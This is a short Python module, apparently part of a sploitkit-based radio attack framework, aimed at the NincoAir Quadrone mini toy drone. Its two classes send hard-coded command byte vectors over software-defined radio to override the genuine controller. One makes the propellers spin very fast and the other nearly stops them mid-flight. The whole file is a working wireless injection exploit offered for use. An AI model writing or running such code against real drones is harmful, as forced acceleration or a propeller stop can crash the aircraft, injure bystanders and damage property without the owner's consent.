# -*- coding: UTF-8 -*-
__copyright__ = "E. Borel"
__license__ = "agpl-3.0"
__doc__ = """
Module for NincoAir Quadrone mini
"""

from sploitkit import *
from lib.radio.NincoAirModule import NincoAirModule

from gnuradio import blocks
from gnuradio import digital
from gnuradio import gr
import osmosdr

class TakeOffUltra(NincoAirModule):
	"""
	Makes the propellers spinning really fast, or at least disturbs the commands of the genuine controller. Knowing the channel on which the drone operates is required  
	"""
	path = "command/nincoair/quadrone_mini"

	def __init__(self):
		super(TakeOffUltra, self).__init__()

	def run(self):
		"""
		Starts the propellers of the drone really fast
		"""
		vector = [202, 102, 214, 53, 0, 65, 194, 69, 181, 125, 127, 53, 189, 74, 87, 115, 111, 154, 203]
		super().run(tuple(self.preamble + self.TXid + vector))

class Slowdown(NincoAirModule):
	"""
	It is the inverse of take_off_ultra. It at least distrubs the flight, or stops the propellers.
	Knowing the channel on which the drone operates is required
	"""
	path = "command/nincoair/quadrone_mini"

	def __init__(self):
		super(Slowdown, self).__init__()

	def run(self):
		"""
		Slows down the propellers (almost stopped if signal strong enough)
		"""
		vector = [204, 192, 225, 6, 255, 49, 201, 195, 32, 125, 127, 53, 189, 74, 83, 114, 207, 154, 202]
		super().run(tuple(self.preamble + self.TXid + vector))
